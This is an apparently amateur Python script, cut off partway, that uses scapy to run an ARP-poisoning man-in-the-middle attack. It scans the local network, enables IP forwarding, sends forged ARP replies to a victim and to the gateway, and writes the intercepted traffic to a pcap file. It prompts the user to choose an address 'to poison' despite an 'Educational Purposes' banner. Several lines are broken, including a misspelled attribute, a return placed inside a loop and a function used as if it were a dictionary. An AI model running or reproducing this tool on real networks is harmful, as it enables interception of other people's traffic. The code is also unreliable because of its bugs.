import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Address
import threading


# import current directory
cwd = os.getcwd()


def in_sudo_mode():
    # if not in sudo mode, exit
    if not 'SUDO_UID' in os.environ.keys():
        print("Please run this script in sudo mode")
        exit()


def arp_scan(ip_range):
    arp_responses = list()

    answered_list = scapy.arping(ip_range, verbose=0)[0]
    for res in answered_list:
        arp_responses.append({'ip': res[1].prsc, 'mac': res[1].hwsrc})
        return arp_responses


def is_gateway(gateway_ip):
    result = subprocess.run(
        ["route", "-n"], capture_output=True).stdout.decode().split("\n")
    for row in result:
        if gateway_ip in row:
            return True
    return False


def get_interface_names():
    os.chdir("/sys/class/net")
    interface_names = os.listdir()
    return interface_names


def match_interface_name(row):
    interface_names = get_interface_names()
    for iface in interface_names:
        if iface in row:
            return True


def gateway_info(network_info):
    result = subprocess.run(
        ["route", "-n"], capture_output=True).stdout.decode().split("\n")
    gateways = []
    for iface in network_info:
        for row in result:
            if iface["ip"] in row:
                iface_name = match_interface_name(row)
                gateways.append(
                    {"iface": iface_name, "ip": iface["ip"], "mac": iface["mac"]})
    return gateways

def clients( arp_res, gateway_res):
    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            if item["ip"] != gateway["ip"]:
                client_list.append(item)
    return client_list

def allow_ip_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])
    
def arp_spoofer(target_ip, target_mac, spoof_ip):
    pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)

def send_spoof_packets():
    while True:
        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
        time.sleep(3)
        
def packet_sniffer(interface):
    packets = scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    
def process_sniffed_packet(packet):
    print("Writing packet to file. Press Ctrl+C to stop")
    scapy.wrpcap("packets.pcap", packet, append=True)
    
def print_arp_res(arp_res):
    print("IP\t\t\tMAC Address\n-----------------------------------------")
    print("\n****************************************************************")
    print("\n* For Educational Purposes                                     *")
    print("\n* https://github.com/Domains18                                  *")
    print("\n* To Whom Much has been given                                  *")
    print("\n* Much Has Been Given                                 *")
    print("\n****************************************************************")
    print("ID\t\tIP\t\t\tMAC Address")
    print("_________________________________________________________")
    for id, res in enumerate(arp_res):
        print(f"{id}\t\t{res['ip']}\t\t{res['mac']}")
    while True:
        try: 
            choice = int(input("Please select the Ip Address to poison: "))